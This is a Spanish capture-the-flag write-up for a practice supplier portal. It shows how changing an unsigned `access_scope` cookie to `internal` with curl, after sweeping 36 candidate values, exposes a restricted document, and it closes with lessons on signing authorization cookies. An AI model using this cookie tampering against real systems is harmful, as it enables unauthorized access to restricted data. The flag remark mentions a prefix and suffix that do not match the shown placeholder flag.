# Credencial prestada — portal de proveedores Asterion / Crimson Logistics

| Campo | Valor |
|---|---|
| Categoría | Web — Broken Access Control / manipulación de cookie de alcance |
| URL | `https://<host>/login` |
| Credenciales | `proveedor01` / `Crimson-0826!` |
| Estado | ✅ Resuelto |
| Flag | `flag{ejemplo}` |

## Enunciado (resumen)

El 15/08 Crimson Logistics cerró la entrega **CL-7903** para Asterion Life Sciences.
Horas después el mismo registro volvió a tener actividad: se incorporó documentación a
una entrega ya cerrada y su **clasificación fue modificada**. Un proveedor dejó una
credencial temporal que aún funciona y una nota: *«No termina donde dice el
manifiesto.»* Hay que revisar el portal y averiguar qué ocurrió.

## 1. Acceso

`POST /login` con `username=proveedor01&password=Crimson-0826!`.

Al autenticarse, el servidor entrega **dos cookies**:

| Cookie | Valor | Observación |
|---|---|---|
| `asterion_session` | `.eJw1yjEOgCAMQNG7...` | sesión Flask firmada (itsdangerous) |
| `access_scope` | `vendor` | ⚠️ **texto plano, sin firma** |

## 2. Reconocimiento

```
/portal      -> 200  Resumen: 3 entregas (CL-7841, CL-7903, CL-7911) + actividad
/documents   -> 200  4 documentos; el 4º es "Anexo de transferencia — CL-7903"
```

El resumen y la línea de tiempo ya cuentan la historia:

```
15 ago · 03:12  Documento asociado   - Anexo incorporado a CL-7903
                                     (añadido después del cierre logístico)
15 ago · 03:18  Clasificación doc.   - Visibilidad de anexo actualizada
                                     (registro asociado a CL-7903)
```

En `/documents`, el anexo aparece como **Restringido**:

> «Recurso complementario asociado a CL-7903. **No disponible para la
> organización actual.**» → botón *Consultar disponibilidad* → `/documents/anexo-cl-7903`

## 3. La vulnerabilidad: alcance controlado por el cliente

`/documents/anexo-cl-7903` con `access_scope=vendor` devuelve **403**. El servidor
confía en la cookie de alcance sin firmarla ni atarla a la sesión, así que basta
cambiarla:

```bash
curl -b "asterion_session=<sesión>; access_scope=internal" \
     https://<host>/documents/anexo-cl-7903
# -> 200
```

Barrido de valores probados (36):

| Resultado | Valores |
|---|---|
| ✅ 200 | **`internal`** |
| ❌ 403 | `vendor`, `admin`, `administrator`, `administracion`, `asterion`, `interno`, `auditor`, `audit`, `compliance`, `security`, `seguridad`, `ops`, `operaciones`, `all`, `root`, `superadmin`, `quality`, `qa`, `clasificado`, `classified`, `restricted`, `full`, `partner`, `customer`, `cliente`, `logistics`, `crimson`, `asterion_internal`, `internal_admin`, `ADMIN`, `Admin`, `VENDOR`, `1`, `true`… |

Solo el valor en **inglés** `internal` funciona (no `interno`, no `admin`): el alcance
es una etiqueta, no un rol jerárquico.

## 4. El documento interno

```
USO INTERNO // TRANSFERENCIA CONTROLADA // SECTOR VI
PROGRAMA HELIX
Anexo de transferencia HX-103        Referencia logística CL-7903
Registro interno HX-103              Expediente RC-09-98      Estado TRANSFERIDO

Contenedor HX-103 recibido en Sector VI a las 02:40 del 15/08/2026
sin desviaciones térmicas. En la documentación visible para Crimson
Logistics se registró solo como «Unidad criogénica»; el registro
interno lo identifica como material biológico experimental de origen
humano asociado al Programa HELIX.

03:12 · Anexo incorporado al registro de transferencia.
03:18 · Visibilidad modificada a uso interno.

CONTROL DOCUMENTAL // CÓDIGO DE VALIDACIÓN DEL EXPEDIENTE
flag{ejemplo}
```

## 5. Exploit reproducible

```bash
python3 solucion/scope_bruteforce.py
```

El script inicia sesión implícitamente (usa la cookie ya emitida), prueba los valores
de `access_scope` y guarda la respuesta 200 como `work/anexo_internal.html`.

## Flag

```
flag{ejemplo}
```

> Nota: el prefijo `PRUEBA` y el sufijo `Web02_2026` parecen propios del entorno de
> práctica de la plataforma (no hay otra flag en el sitio: se revisaron `/documents`,
> `/portal`, rutas de actividad/entregas y el resto devuelve 404).

## Lecciones

- Una cookie que decide autorización **nunca** debe ser editable por el cliente: aquí
  iba en claro y sin firmar, mientras la sesión sí estaba firmada (comparación directa
  del error).
- El nombre del reto («cookies») era literal: no hubo que romper el JWT/sesión de
  Flask, solo el flag de alcance.
- La línea de tiempo (`03:12` documento añadido, `03:18` visibilidad cambiada) es la
  prueba del encubrimiento: el anexo se incorporó **después** del cierre.

## Archivos de la carpeta

| Ruta | Contenido |
|---|---|
| `flag.txt` | flag final |
| `CONTEXTO.md` | este writeup |
| `solucion/scope_bruteforce.py` | prueba valores de `access_scope` y detecta la flag |
| `work/` | login, portal, documentos (vendor/internal), anexo interno |
